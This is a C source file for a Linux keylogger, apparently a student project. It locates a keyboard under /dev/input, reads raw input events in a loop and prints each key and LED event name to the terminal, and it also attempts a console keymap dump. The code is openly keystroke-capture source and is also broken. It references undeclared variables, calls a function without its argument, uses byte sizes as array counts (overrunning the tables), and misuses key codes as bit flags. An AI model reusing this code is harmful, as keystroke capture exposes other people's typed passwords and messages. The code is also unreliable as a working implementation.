/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/05 11:06:00 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <signal.h>
#include <linux/keyboard.h>

#ifndef MAX_NR_KEYMAPS
# define MAX_NR_KEYMAPS NR_KEYMAPS
#endif

static int			filter(const struct dirent *file)
{
	char			filename[512];
	struct stat		filestat;

	snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);
	if (stat(filename, &filestat))
		return 0;
	return S_ISCHR(filestat.st_mode);
}

static char			*get_keyboard()
{
	int				num;
	struct dirent	**files;
	int32_t			event_bitmap;
	int32_t			keybd_bitmap;
	char			filename[512];
	int				fd;
	char			*keybd;

	if ((num = scandir("/dev/input/", &files, &filter, &alphasort)) < 0)
		return NULL;
	keybd = NULL;
	for (int i = 0; i < num; i++)
	{
		if (!keybd)
		{
			event_bitmap = 0;
			keybd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;
			snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", files[i]->d_name);
			fd = open(filename, O_RDONLY);
			if (fd != -1)
			{
				ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
				if ((EV_KEY & event_bitmap) == EV_KEY)
				{
					ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
					if ((keybd_bitmap & event_bitmap) == keybd_bitmap)
						keybd = strdup(filename);
				}
				close(fd);
			}
		}
		free(files[i]);
	}
	free(files);
	return keybd;
}

int loop;
typedef struct 	s_event
{
	char *name;
	int value;
}				t_event;

t_event	event[] = {
	{ "EV_SYN", 				EV_SYN },
	{ "EV_KEY", 				EV_KEY },
	{ "EV_REL", 				EV_REL },
	{ "EV_ABS", 				EV_ABS },
	{ "EV_MSC", 				EV_MSC },
	{ "EV_SW",					EV_SW },
	{ "EV_LED",					EV_LED },
	{ "EV_SND", 				EV_SND },
	{ "EV_REP", 				EV_REP },
	{ "EV_FF", 					EV_FF },
	{ "EV_PWR", 				EV_PWR },
	{ "EV_FF_STATUS", 			EV_FF_STATUS }
};

t_event msc[] = {
	{ "MSC_SERIAL",				MSC_SERIAL },
	{ "MSC_PULSELED",			MSC_PULSELED },
	{ "MSC_GESTURE",			MSC_GESTURE },
	{ "MSC_RAW",				MSC_RAW },
	{ "MSC_SCAN",				MSC_SCAN },
	{ "MSC_TIMESTAMP",			MSC_TIMESTAMP }
};

t_event key[] = {
	{ "KEY_RESERVED",			KEY_RESERVED },
	{ "KEY_ESC",				KEY_ESC },
	{ "KEY_1",					KEY_1 },
	{ "KEY_2",					KEY_2 },
	{ "KEY_3",					KEY_3 },
	{ "KEY_4",					KEY_4 },
	{ "KEY_5",					KEY_5 },
	{ "KEY_6",					KEY_6 },
	{ "KEY_7",					KEY_7 },
	{ "KEY_8",					KEY_8 },
	{ "KEY_9",					KEY_9 },
	{ "KEY_0",					KEY_0 },
	{ "KEY_G",					KEY_G },
	{ "KEY_H",					KEY_H },
	{ "KEY_MINUS",				KEY_MINUS },
	{ "KEY_EQUAL",				KEY_EQUAL },
	{ "KEY_BACKSPACE",			KEY_BACKSPACE },
	{ "KEY_TAB",				KEY_TAB },
	{ "KEY_Q",					KEY_Q },
	{ "KEY_W",					KEY_W },
	{ "KEY_E",					KEY_E },
	{ "KEY_R",					KEY_R },
	{ "KEY_T",					KEY_T },
	{ "KEY_Y",					KEY_Y },
	{ "KEY_U",					KEY_U },
	{ "KEY_I",					KEY_I },
	{ "KEY_O",					KEY_O },
	{ "KEY_P",					KEY_P },
	{ "KEY_LEFTBRACE",			KEY_LEFTBRACE },
	{ "KEY_RIGHTBRACE",			KEY_RIGHTBRACE },
	{ "KEY_ENTER",				KEY_ENTER },
	{ "KEY_LEFTCTRL",			KEY_LEFTCTRL },
	{ "KEY_A",					KEY_A },
	{ "KEY_S",					KEY_S },
	{ "KEY_D",					KEY_D },
	{ "KEY_F",					KEY_F },
	{ "KEY_J",					KEY_J },
	{ "KEY_K",					KEY_K },
	{ "KEY_L",					KEY_L },
	{ "KEY_SEMICOLON",			KEY_SEMICOLON },
	{ "KEY_APOSTROPHE",			KEY_APOSTROPHE },
	{ "KEY_GRAVE",				KEY_GRAVE },
	{ "KEY_LEFTSHIFT",			KEY_LEFTSHIFT },
	{ "KEY_BACKSLASH",			KEY_BACKSLASH },
	{ "KEY_Z",					KEY_Z },
	{ "KEY_X",					KEY_X },
	{ "KEY_C",					KEY_C },
	{ "KEY_V",					KEY_V },
	{ "KEY_B",					KEY_B },
	{ "KEY_N",					KEY_N },
	{ "KEY_M",					KEY_M },
	{ "KEY_COMMA",				KEY_COMMA },
	{ "KEY_DOT",				KEY_DOT },
	{ "KEY_SLASH",				KEY_SLASH },
	{ "KEY_RIGHTSHIFT",			KEY_RIGHTSHIFT },
	{ "KEY_KPASTERISK",			KEY_KPASTERISK },
	{ "KEY_LEFTALT",			KEY_LEFTALT },
	{ "KEY_SPACE",				KEY_SPACE },
	{ "KEY_CAPSLOCK",			KEY_CAPSLOCK },
	{ "KEY_F1",					KEY_F1 },
	{ "KEY_F2",					KEY_F2 },
	{ "KEY_F3",					KEY_F3 },
	{ "KEY_F4",					KEY_F4 },
	{ "KEY_F5",					KEY_F5 },
	{ "KEY_F6",					KEY_F6 },
	{ "KEY_F7",					KEY_F7 },
	{ "KEY_F8",					KEY_F8 },
	{ "KEY_F9",					KEY_F9 },
	{ "KEY_F10",				KEY_F10 },
	{ "KEY_NUMLOCK",			KEY_NUMLOCK },
	{ "KEY_SCROLLLOCK",			KEY_SCROLLLOCK },
	{ "KEY_KP7",				KEY_KP7 },
	{ "KEY_KP8",				KEY_KP8 },
	{ "KEY_KP9",				KEY_KP9 },
	{ "KEY_KPMINUS",			KEY_KPMINUS },
	{ "KEY_KP4",				KEY_KP4 },
	{ "KEY_KP5",				KEY_KP5 },
	{ "KEY_KP6",				KEY_KP6 },
	{ "KEY_KPPLUS",				KEY_KPPLUS },
	{ "KEY_KP1",				KEY_KP1 },
	{ "KEY_KP2",				KEY_KP2 },
	{ "KEY_KP3",				KEY_KP3 },
	{ "KEY_KP0",				KEY_KP0 },
	{ "KEY_KPDOT",				KEY_KPDOT },
	{ "KEY_ZENKAKUHANKAKU",		KEY_ZENKAKUHANKAKU },
	{ "KEY_102ND",				KEY_102ND },
	{ "KEY_F11",				KEY_F11 },
	{ "KEY_F12",				KEY_F12 },
	{ "KEY_RO",					KEY_RO },
	{ "KEY_KATAKANA",			KEY_KATAKANA },
	{ "KEY_HIRAGANA",			KEY_HIRAGANA },
	{ "KEY_HENKAN",				KEY_HENKAN },
	{ "KEY_KATAKANAHIRAGANA",	KEY_KATAKANAHIRAGANA },
	{ "KEY_MUHENKAN",			KEY_MUHENKAN },
	{ "KEY_KPJPCOMMA",			KEY_KPJPCOMMA },
	{ "KEY_KPENTER",			KEY_KPENTER },
	{ "KEY_RIGHTCTRL",			KEY_RIGHTCTRL },
	{ "KEY_KPSLASH",			KEY_KPSLASH },
	{ "KEY_SYSRQ",				KEY_SYSRQ },
	{ "KEY_RIGHTALT",			KEY_RIGHTALT },
	{ "KEY_LINEFEED",			KEY_LINEFEED },
	{ "KEY_HOME",				KEY_HOME },
	{ "KEY_UP",					KEY_UP },
	{ "KEY_PAGEUP",				KEY_PAGEUP },
	{ "KEY_LEFT",				KEY_LEFT },
	{ "KEY_RIGHT",				KEY_RIGHT },
	{ "KEY_END",				KEY_END },
	{ "KEY_DOWN",				KEY_DOWN },
	{ "KEY_PAGEDOWN",			KEY_PAGEDOWN },
	{ "KEY_INSERT",				KEY_INSERT },
	{ "KEY_DELETE",				KEY_DELETE },
	{ "KEY_MACRO",				KEY_MACRO },
	{ "KEY_MUTE",				KEY_MUTE },
	{ "KEY_VOLUMEDOWN",			KEY_VOLUMEDOWN },
	{ "KEY_VOLUMEUP",			KEY_VOLUMEUP },
	{ "KEY_POWER",				KEY_POWER },
	{ "KEY_KPEQUAL",			KEY_KPEQUAL },
	{ "KEY_KPPLUSMINUS",		KEY_KPPLUSMINUS },
	{ "KEY_PAUSE",				KEY_PAUSE },
	{ "KEY_SCALE",				KEY_SCALE },
	{ "KEY_KPCOMMA",			KEY_KPCOMMA },
	{ "KEY_HANGEUL",			KEY_HANGEUL },
	{ "KEY_HANGUEL",			KEY_HANGUEL },
	{ "KEY_HANJA",				KEY_HANJA },
	{ "KEY_YEN",				KEY_YEN },
	{ "KEY_LEFTMETA",			KEY_LEFTMETA },
	{ "KEY_RIGHTMETA",			KEY_RIGHTMETA },
	{ "KEY_COMPOSE",			KEY_COMPOSE }
};

t_event led[] = {
	{ "LED_NUML", 				LED_NUML },
	{ "LED_CAPSL", 				LED_CAPSL },
	{ "LED_SCROLLL", 			LED_SCROLLL },
	{ "LED_COMPOSE", 			LED_COMPOSE },
	{ "LED_KANA", 				LED_KANA },
	{ "LED_SLEEP", 				LED_SLEEP },
	{ "LED_SUSPEND", 			LED_SUSPEND },
	{ "LED_MUTE", 				LED_MUTE },
	{ "LED_MISC", 				LED_MISC },
	{ "LED_MAIL", 				LED_MAIL },
	{ "LED_CHARGING", 			LED_CHARGING }
};

void sigint(int sig)
{
	(void)sig;
	loop = 0;
}

static void	keylogger(int keybd)
{
	int		nbread;
	struct input_event	events[128];

	signal(SIGINT, sigint);
	loop = 1;
	while (loop)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			char *name = "UNKNOWN";
			for (size_t j = 0; j < sizeof(event); j++)
			{
				if (events[i].type == event[j].value)
				{
					name = event[j].name;
					break ;
				}
			}
			printf("type: %s ", name);
			if (events[i].type == EV_KEY)
			{
				name = "UNKNOWN";
				for (size_t j = 0; j < sizeof(key); j++)
				{
					if (events[i].code == key[j].value)
					{
						name = key[j].name;
						break ;
					}
				}
				printf("code: %s ", name);
			}
			else if (events[i].type == EV_LED)
			{
				name = "UNKNOWN";
				for (size_t j = 0; j < sizeof(led); j++)
				{
					if (events[i].code == led[j].value)
					{
						name = led[j].name;
						break ;
					}
					// printf("%ld\n", j);
				}
				printf("code: %s ", name);
			}
			else if (events[i].type == EV_MSC)
			{
				name = "UNKNOWN";
				for (size_t j = 0; j < sizeof(key); j++)
				{
					if (events[i].code == msc[j].value)
					{
						name = msc[j].name;
						break ;
					}
				}
				printf("code: %s ", name);
			} else {
				printf("code: %d ", events[i].code);
			}
			printf("value: %d ; ", events[i].value);
		}
		printf("\n");
	}
}

typedef struct	s_keys
{
	char	*name;
	size_t	value;
}				t_keys;

static int	is_a_console(int fd)
{
	char	arg;

	arg = 0;
	return (ioctl(fd, KDGKBTYPE, &arg) == 0 && ((arg == KB_101) || (arg == KB_84)));
}

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

static void			get_keys(int fd, char ***key_table)
{
	struct kbentry	ke;
	int				ret;

	for (int i = 0; i < MAX_NR_KEYMAPS; i++) {
		ke.kb_index = 0;
		ke.kb_table = 1;
		ret = ioctl(fd, KDGKBENT, (unsigned long)&ke);
		if (ret && errno != EINVAL) {
			perror("KDBGENT");
			fprintf(stderr, "KDBGENT error at index 0 in table %d\n", i);
			return ;
		}
		if (!ret && ke.kb_value != K_NOSUCHMAP) {
			key_table[i][0] = NULL;
		} else {
			key_table[i][0] = NULL;
		}
	}
}

static char			***allocate_keys(int fd)
{
	int				nb_keys;
	char			***key_table;

	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	key_table = malloc(sizeof(*keys) * nb_keys);
	if (key_table == NULL) {
		fprintf(stderr, "Can't allocate %do for keys\n", nb_keys);
		return NULL;
	}
	for (int i = 0; i < nb_keys; i++)
	{
		key_table[i] = malloc(sizeof(**key_table) * MAX_NR_KEYMAPS);
		if (key_table[i] == NULL) {
			fprintf(stderr, "Can't allocate %do for %dth key\n", MAX_NR_KEYMAPS, i);
			for (int j = 0; j < i; j++)
				free(key_table[j]);
			free(key_table);
			return NULL;
		}
	}
	get_keys(fd, key_table);
	return key_table;
}

static char ***dumpkeys()
{
	char	*console[] = { "/dev/tty", "/dev/tty0", "/dev/vc/0", "/dev/console" };
	int		fd;

	fd = -1;
	for (size_t i = 0; i < sizeof(console) / sizeof(*console); i++)
	{
		fd = open(console[i], O_RDWR);
		if (fd < 0 && errno == EACCES)
			fd = open(console[i], O_WRONLY);
		if (fd < 0 && errno == EACCES)
			fd = open(console[i], O_RDONLY);
		if (fd < 0)
			continue ;
		arg = 0;
		if (is_a_console(fd))
			break ;
		close(fd);
		fd = -1;
	}
	if (fd < 0)
		for (fd = 0; fd < 3; fd++)
			if (is_a_console(fd))
				break ;
	if (fd < 0) {
		fprintf(stderr, "Can't get a file descriptor refering to a terminal\n");
		return NULL;
	}
	return allocate_keys();
}

int			main(void)
{
	char	***key_table;
	char	*keyboard;
	int		fd;

	key_table = dumpkeys();
	if ((keyboard = get_keyboard()) == NULL)
		return 1;
	printf("keyboard: %s\n", keyboard);
	if ((fd = open(keyboard, O_RDONLY)) < 0)
		return 1;
	free(keyboard);
	keylogger(fd);
	close(fd);
	return 0;
}
